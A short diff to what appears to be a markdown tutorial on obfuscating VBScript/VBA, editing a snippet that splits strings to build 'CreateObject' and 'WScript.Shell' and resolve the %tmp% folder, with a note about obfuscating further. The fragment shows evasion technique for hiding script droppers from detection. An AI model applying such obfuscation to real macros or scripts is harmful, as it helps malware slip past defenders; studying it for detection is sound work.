@@ -1365,11 +1365,10 @@ Here we can view the all process of encoding/decoding in powershell console
 
 ![vbscript obfuscation](http://i.cubeupload.com/oQs8qp.png)
 
-- Further obfuscation [ vba funtion names var substitution ]<br />
+- Further obfuscation [ vba funtion/methods names var substitution ]<br />
 
       TODO: [ note-to-self :: Obfuscate even further ]
-      Dim fSkHguEi
-      dIM sUiDnUl1
+      Dim DvFoiUrs0, PiDkLBxQ1, fSkHguEi, sUiDnUl1
       fSkHguEi = "cR"+"eAt" + "EObJ"+"eCt"
       sUiDnUl1 = "W" + "sCr"+"Ip" + "T"
       DvFoiUrs0 = fSkHguEi("" + sUiDnUl1 + ".Sh" + "el"+"l").eXpAnDEnvIrOnMeNTSrInGs("%t" + "mp%")
